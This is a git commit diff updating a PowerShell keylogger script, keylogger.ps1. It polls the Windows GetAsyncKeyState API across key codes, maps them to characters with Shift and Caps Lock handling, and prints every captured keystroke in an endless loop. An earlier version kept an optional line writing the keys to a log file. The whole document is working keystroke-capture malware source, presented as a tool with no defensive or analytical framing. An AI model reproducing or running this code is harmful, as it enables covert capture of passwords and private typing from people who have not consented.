75c7667f6528863323b575e6ab61e0e367383df7
Androsh7 <Androsh7@gmail.com>
2025-03-14 21:38:30 -0600

    Update to allow for more accurate character printing

--- keylogger.ps1
+++ keylogger.ps1
@@ -32,53 +32,105 @@ $Signature = @'
     [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
     public static extern short GetAsyncKeyState(int virtualKeyCode); 
 '@
+
 Add-Type -MemberDefinition $Signature -Name Keyboard -Namespace PsOneApi
-do
-{
-	for ($i = 0; $i -le 255; $i = $i + 1)
-	{
-		$keynum = [byte]$i
-		if ( [bool]([PsOneApi.Keyboard]::GetAsyncKeyState($keynum) -eq -32767))
-		{
-			$skip = $false
-			switch ($keynum) {
-				1 { $outkey = "LMB" }
-				2 { $outkey = "RMB" }
-				8 { $outkey = "BACK" }
-				9 { $outkey = "TAB" }
-				13 { $outkey = "ENTER" }
-				16 { $skip = $true } # SHIFT
-				17 { $skip = $true } # CTRL
-				18 { $skip = $true } # ALT
-				20 { $outkey = "CAPS" }
-				27 { $outkey = "ESC" }
-				32 { $outkey = "SPACE" }
-				33 { $outkey = "Page_Down" }
-				34 { $outkey = "Page_UP" }
-				36 { $outkey = "HOME" }
-				91 { $outkey = "WIN" }
-				160 { $outkey = "LSHIFT" }
-				161 { $outkey = "RSHIFT" }
-				162 { $outkey = "LCTRL" }
-				163 { $outkey = "RCTRL" }
-				164 { $outkey = "LALT" }
-				187 { $outkey = "=" }
-				189 { $outkey = "-" }
-				219 { $outkey = "[" }
-				221 { $outkey = "]" }
-				220 { $outkey = "\" }
+Add-Type -AssemblyName System.Windows.Forms
+
+# ignore UNK characters
+$ignore_non_printable = $true
+
+$letter_dict = @{
+	#1 = @("LMB", "LMB")
+	#2 = @("RMB", "RMB")
+	#4 = @("MMB", "MMB")
+	#6 = @("HOME", "HOME") # Home
+	8 = @("`b", "`b") # Backspace
+	9 = @("`t", "`t") # Tab
+	13 = @("`n", "`n") # Enter
+	#20 = @("CAPS", "CAPS")
+	#27 = @("ESC", "ESC")
+	32 = @(" ", " ")
+	#33 = @("PAGE_UP", "PAGE_UP")
+	#34 = @("PAGE_DOWN", "PAGE_DOWN")
+	#91 = @("WIN", "WIN")
+	#160 = @("LSHIFT", "LSHIFT")
+	#161 = @("RSHIFT", "RSHIFT")
+	#162 = @("LCTRL", "LCTRL")
+	#163 = @("RCTRL", "RCTRL")
+	#164 = @("LALT", "LALT")
+	186 = @(";", ":")
+	187 = @("=", "+")
+	188 = @(",", "<")
+	189 = @("-", "_")
+	190 = @(".", ">")
+	191 = @("/", "?")
+	192 = @("``", "~")
+	219 = @("[", "{")
+	220 = @("\", "|")
+	221 = @("]", "}")
+	222 = @("'", '"')
+}
+$num_dict = @{
+	48 = @("0", ")")
+	49 = @("1", "!")
+	50 = @("2", "@")
+	51 = @("3", "#")
+	52 = @("4", "$")
+	53 = @("5", "%")
+	54 = @("6", "^")
+	55 = @("7", "&")
+	56 = @("8", "*")
+	57 = @("9", "(")
+}
+if ($ignore_non_printable) {
+	$key_list = $letter_dict.Keys
+	$key_list += $num_dict.Keys
+	$key_list += 65..90 # A-Z
+} else {
+	$key_list = 1..255
+}
+
+function GetKeyState ($key, $mask = 0x7FFF) {
+	return [bool](([PsOneApi.Keyboard]::GetAsyncKeyState([byte]$key)) -band $mask)
+}
+
+while($true) {
+
+	# check if shift and caps lock are pressed
+	$SHIFT = GetKeyState -key 16 -mask 0x8000
+	$CAPS = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
+	
+	# determines whether to shift the characters
+	$CHAR_SHIFT = $SHIFT -xor $CAPS
+
+	foreach ($keynum in $key_list) {
+		if (GetKeyState($keynum)) {
+
+			# printing for A-Za-z ASCII characters
+			if ($keynum -in 65..90) {
+				if ($CHAR_SHIFT) { $outkey = [char]$keynum } 
+				else { $outkey = [char]($keynum + 32) }
 			}
-			if (($keynum -ge 48 -and $keynum -le 57) -or ($keynum -ge 65 -and $keynum -le 90)) { $outkey = [char]$keynum }
-			
-			if ([bool]$outkey -eq $false){
-				$outkey = "UNK-${keynum}"
+
+			# printing for 0-9 ASCII characters
+			elseif ($keynum -in $num_dict.Keys) {
+				$outkey = $num_dict.Item($keynum)[$SHIFT]
 			}
-		if ($skip -eq $false) {
-			Write-Host -NoNewLine "${outkey}:"
-			#$outkey | Out-File -Append -NoNewLine -FilePath ".\log.txt" 
-		}
-			$outkey = ""
-			
+
+			# printing for other characters
+			else {
+				try {
+					$outkey = $letter_dict.Item($keynum)[$CHAR_SHIFT]
+				}
+				catch {
+					if ($ignore_non_printable) { $outkey = $false } 
+					else { $outkey = ":UNK-${keynum}:" }
+				}
+			}
+
+			# print the key
+			if ($outkey) { Write-Host -NoNewLine $outkey }
+			$outkey = $false
 		}
 	}
-} while($true)
+}
